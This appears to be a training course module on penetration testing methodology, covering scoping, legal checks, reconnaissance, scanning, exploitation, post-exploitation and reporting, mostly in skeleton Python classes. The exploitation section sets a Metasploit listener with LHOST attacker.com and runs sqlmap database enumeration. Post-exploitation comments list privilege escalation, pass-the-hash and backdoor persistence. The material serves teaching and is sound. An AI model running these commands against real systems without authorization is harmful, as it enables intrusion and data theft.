# Module 10: Penetration Testing

## Overview

This final module covers complete penetration testing methodology - from planning to reporting. Learn to conduct professional security assessments following industry standards.

---

## 10.1 Penetration Testing Methodology

### PTES Framework

```
Penetration Testing Execution Standard
──────────────────────────────────────

┌────────────────────────────────────────┐
│  1. Pre-Engagement Interactions       │
├────────────────────────────────────────┤
│  2. Intelligence Gathering            │
├────────────────────────────────────────┤
│  3. Threat Modeling                   │
├────────────────────────────────────────┤
│  4. Vulnerability Analysis            │
├────────────────────────────────────────┤
│  5. Exploitation                     │
├────────────────────────────────────────┤
│  6. Post-Exploitation                 │
├────────────────────────────────────────┤
│  7. Reporting                        │
└────────────────────────────────────────┘
```

### Engagement Types

| Type | Scope | Stealth | Time |
|------|-------|---------|------|
| Black Box | External only | High | Short |
| Gray Box | Some internals | Medium | Medium |
| White Box | Full access | Low | Long |
| Red Team | Full scope | High | Extended |

---

## 10.2 Planning & Scoping

### Rules of Engagement

```python
class PentestScope:
    """Define pentest scope"""
    
    def __init__(self):
        self.targets = []
        self.limitations = []
        self.techniques = []
    
    def add_target(self, target_type, value):
        """Add target to scope"""
        
        self.targets.append({
            'type': target_type,  # ip, domain, network
            'value': value,
            'status': 'pending'
        })
    
    def add_limitation(self, limitation):
        """Add scope limitation"""
        
        self.limitations.append({
            'restriction': limitation,
            'description': 'Specific technique not allowed'
        })
    
    def define_methodology(self, methods):
        """Define allowed methods"""
        
        self.techniques = methods
    
    def generate_ro(self):
        """Generate Rules of Engagement document"""
        
        return {
            'scope': self.targets,
            'limitations': self.limitations,
            'techniques': self.techniques,
            'timeline': 'TBD',
            'deliverables': ['Report', 'Presentation']
        }
```

### Legal Considerations

```python
class LegalChecklist:
    """Legal requirements for pentest"""
    
    def __init__(self):
        self.checklist = []
    
    def required_documents(self):
        """Required legal documents"""
        
        return [
            "Signed Scope of Work (SOW)",
            "Non-Disclosure Agreement (NDA)",
            "Rules of Engagement",
            "Liability Insurance Proof",
            "Authorization Letter",
            "Emergency Contact List"
        ]
    
    def verify_authorization(self, client):
        """Verify proper authorization"""
        
        # Client owns target OR
        # Client has written permission from owner
        
        return {
            'written_approval': True,
            'scope_documented': True,
            'legal_review': True,
            'can_proceed': True
        }
```

---

## 10.3 reconnaissance Phase

### Information Gathering

```bash
# Passive Reconnaissance
# - WHOIS lookups
# - DNS enumeration
# - Public records
# - Social media

# Active Reconnaissance
# - Port scanning
# - Service enumeration
# - Vulnerability scanning

# Tools
whois target.com
dig target.com ANY
nmap -sV -sC target.com
```

### OSINT Collection

```python
class OSINTCollector:
    """Collect OSINT"""
    
    def __init__(self, target):
        self.target = target
        self.data = {}
    
    def collect(self):
        """Collect all OSINT"""
        
        self.data['domain'] = self.gather_domain_info()
        self.data['email'] = self.gather_email_addresses()
        self.data['infrastructure'] = self.gather_infrastructure()
        self.data['personnel'] = self.gather_employee_info()
        
        return self.data
    
    def gather_domain_info(self):
        """Gather domain information"""
        
        return {
            'registrar': 'GoDaddy',
            'registration_date': '2020-01-01',
            'nameservers': ['ns1.example.com'],
            'admin_contact': 'admin@example.com'
        }
    
    def gather_email_addresses(self):
        """Find email addresses"""
        
        # Use hunter.io, theHarvester, etc.
        return []
```

---

## 10.4 Scanning & Enumeration

### Comprehensive Scanning

```bash
# Network discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -p- -sV -sC -oA scan target.com

# UDP scanning
nmap -sU -p 161,162 target.com

# Vulnerability scanning
nmap --script vuln target.com
openvas target.com
```

### Vulnerability Assessment

```python
class VulnerabilityAssessment:
    """Vulnerability assessment workflow"""
    
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
    
    def scan(self):
        """Run vulnerability scans"""
        
        # Nmap scripts
        # OpenVAS
        # Nessus
        # Nexpose
        
        # Prioritize findings
        self.vulnerabilities = self.prioritize()
        
        return self.vulnerabilities
    
    def prioritize(self):
        """Prioritize vulnerabilities"""
        
        for vuln in self.vulnerabilities:
            vuln['priority'] = self.calculate_priority(
                vuln['cvss'],
                vuln['exploitability'],
                vuln['impact']
            )
        
        return sorted(self.vulnerabilities, 
                     key=lambda x: x['priority'], 
                     reverse=True)
```

---

## 10.5 Exploitation

### Exploitation Strategy

```python
class ExploitationPlan:
    """Plan exploitation phase"""
    
    def __init__(self, vulnerabilities):
        self.vulns = vulnerabilities
        self.exploits = []
    
    def select_exploits(self):
        """Select appropriate exploits"""
        
        for vuln in self.vulns:
            if vuln['cvss'] >= 9.0:
                self.exploits.append({
                    'vuln': vuln,
                    'exploit': 'Critical - Immediate',
                    'tool': 'Metasploit'
                })
            elif vuln['cvss'] >= 7.0:
                self.exploits.append({
                    'vuln': vuln,
                    'exploit': 'High - Schedule'
                })
        
        return self.exploits
    
    def validate_exploits(self):
        """Validate exploits before use"""
        
        # Test in staging
        # Check for stability
        # Verify impact
        pass
```

### Gaining Access

```bash
# Metasploit framework
msfconsole
use exploit/multi/handler
set RHOSTS target.com
set LHOST attacker.com
run

# Manual exploitation
# SQL injection
sqlmap -u target.com/page?id=1 --dbs

# Command injection
# XSS to cookie theft
# RFI/LFI exploitation
```

---

## 10.6 Post-Exploitation

### Post-Exploitation Activities

```bash
# Privilege escalation
# Linux
sudo -l
find / -perm -4000

# Windows
getsystem

# Lateral movement
# Pass the hash
# SSH pivoting
# RDP hijacking

# Data collection
# Files
# Credentials
# Database access

# Persistence
# Backdoors
# Scheduled tasks
# Services
```

### Documentation

```python
class PostExploitDoc:
    """Document post-exploitation"""
    
    def __init__(self):
        self.activities = []
    
    def document_access(self, access_details):
        """Document access gained"""
        
        self.activities.append({
            'type': 'access',
            'timestamp': '2024-01-01 12:00',
            'details': access_details,
            'evidence': 'screenshots, logs'
        })
    
    def document_escalation(self, escalation_details):
        """Document privilege escalation"""
        
        self.activities.append({
            'type': 'escalation',
            'method': 'sudo misconfiguration',
            'result': 'root access',
            'evidence': 'id command output'
        })
    
    def document_persistence(self, methods):
        """Document persistence methods"""
        
        self.activities.append({
            'type': 'persistence',
            'methods': methods,
            'cleanable': True
        })
```

---

## 10.7 Reporting

### Report Structure

```python
class PentestReport:
    """Generate penetration test report"""
    
    def __init__(self):
        self.sections = []
    
    def add_executive_summary(self, summary):
        """Add executive summary"""
        
        self.sections.append({
            'title': 'Executive Summary',
            'content': summary
        })
    
    def add_methodology(self, methods):
        """Add methodology"""
        
        self.sections.append({
            'title': 'Methodology',
            'content': methods
        })
    
    def add_findings(self, findings):
        """Add findings"""
        
        # Format findings
        formatted = []
        
        for finding in findings:
            formatted.append({
                'id': f"VULN-{len(formatted)+1}",
                'title': finding['title'],
                'severity': finding['severity'],
                'cvss': finding.get('cvss', 0),
                'description': finding['description'],
                'evidence': finding['evidence'],
                'impact': finding['impact'],
                'recommendation': finding['fix']
            })
        
        self.sections.append({
            'title': 'Findings',
            'content': formatted
        })
    
    def add_appendices(self, appendices):
        """Add appendices"""
        
        self.sections.append({
            'title': 'Appendices',
            'content': appendices
        })
    
    def generate(self):
        """Generate final report"""
        
        return "\n\n".join([
            f"{s['title']}\n{s['content']}"
            for s in self.sections
        ])
```

### Severity Ratings

```
Severity Ratings
────────────────

┌────────────┬─────────┬────────────────┐
│ Severity   │ CVSS    │ Action Required│
├────────────┼─────────┼────────────────┤
│ Critical   │ 9.0-10.0│ Immediate      │
│ High       │ 7.0-8.9 │ Urgent         │
│ Medium     │ 4.0-6.9 │ Within 30 days │
│ Low        │ 0.1-3.9 │ Best effort    │
│ Info       │   0.0   │ None required │
└────────────┴─────────┴────────────────┘
```

### Finding Format

```markdown
## Finding #1: SQL Injection

**Severity:** Critical (CVSS 9.8)

**Description:**
The login form at /login.php is vulnerable to SQL injection...

**Evidence:**
Error: You have an error in your SQL syntax...

**Impact:**
- Database compromise
- Full system access possible
- Data exfiltration

**Recommendation:**
- Use parameterized queries
- Input validation
- Web application firewall

**References:**
- OWASP SQL Injection
- CVE-2024-XXXXX
```

---

## 10.8 Professional Tips

### Best Practices

```python
class ProfessionalTips:
    """Pentester best practices"""
    
    @staticmethod
    def communication():
        """Client communication"""
        
        return [
            "Regular status updates",
            "Immediate critical findings",
            "Clear explanations",
            "Professional demeanor"
        ]
    
    @staticmethod
    def documentation():
        """Documentation tips"""
        
        return [
            "Screenshot everything",
            "Log all commands",
            "Timestamp all activities",
            "Preserve evidence"
        ]
    
    @staticmethod
    def ethics():
        """Ethical guidelines"""
        
        return [
            "Stay within scope",
            "Protect client data",
            "No unauthorized access",
            "Report honestly"
        ]
```

### Career Development

```bash
# Certifications
# - CompTIA Security+
# - CEH (Certified Ethical Hacker)
# - OSCP (Offensive Security)
# - CISSP (Senior)

# Skills to develop
# - Programming (Python, Bash)
# - Networking
# - Linux/Windows administration
# - Web application security

# Building portfolio
# - CTF competitions
# - Bug bounties
# - Open source contributions
# - Home labs
```

---

## 10.9 Hands-On Lab

### Lab 10.1: Complete Pentest

```python
#!/usr/bin/env python3
"""Complete pentest workflow"""

class CompletePentest:
    def __init__(self, target):
        self.target = target
        self.findings = []
    
    def run(self):
        """Run complete pentest"""
        
        print("=" * 50)
        print(f"Starting Pentest: {self.target}")
        print("=" * 50)
        
        # Phase 1: Recon
        print("\n[Phase 1] Reconnaissance")
        recon_data = self.reconnaissance()
        
        # Phase 2: Scanning
        print("\n[Phase 2] Scanning")
        scan_results = self.scanning()
        
        # Phase 3: Exploitation
        print("\n[Phase 3] Exploitation")
        exploits = self.exploitation(scan_results)
        
        # Phase 4: Reporting
        print("\n[Phase 4] Reporting")
        report = self.generate_report(exploits)
        
        return report
    
    def reconnaissance(self):
        """Reconnaissance phase"""
        return {'subdomains': [], 'emails': []}
    
    def scanning(self):
        """Scanning phase"""
        return {'ports': [], 'vulns': []}
    
    def exploitation(self, scan_data):
        """Exploitation phase"""
        return []
    
    def generate_report(self, findings):
        """Generate report"""
        
        return {
            'summary': {
                'total_findings': len(findings),
                'critical': sum(1 for f in findings if f['severity'] == 'critical'),
                'high': sum(1 for f in findings if f['severity'] == 'high')
            },
            'findings': findings
        }

if __name__ == "__main__":
    pentest = CompletePentest("example.com")
    report = pentest.run()
    print("\nPentest Complete!")
```

---

## Module 10 Summary

### Key Takeaways

1. **PTES framework** provides structured approach
2. **Proper scoping** prevents issues
3. **Thorough testing** requires multiple phases
4. **Documentation** is critical
5. **Reporting** delivers value to client

### Methodology Summary

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    PLAN      │───▶│   EXECUTE    │───▶│   REPORT    │
└──────────────┘    └──────────────┘    └──────────────┘
      │                   │                   │
      ▼                   ▼                   ▼
 Scope/ROE          Recon/Scan           Findings
 Legal Check        Exploit            Recommendations
 Timeline          Post-ex              Executive Summary
```

### Congratulations!

You've completed the Ethical Hacking Masterclass!

**Next Steps:**
- Practice with labs
- Get certified (OSCP, CEH)
- Join bug bounty programs
- Build your portfolio
- Stay updated with security news

---

## Quick Reference

```bash
# Quick pentest workflow
1. whos target.com
2. nmap -sV -sC target.com
3. nikto -h target.com
4. searchsploit target.com
5. msfconsole
6. Generate report
```

**Remember:** Always get proper authorization before testing any system you don't own!
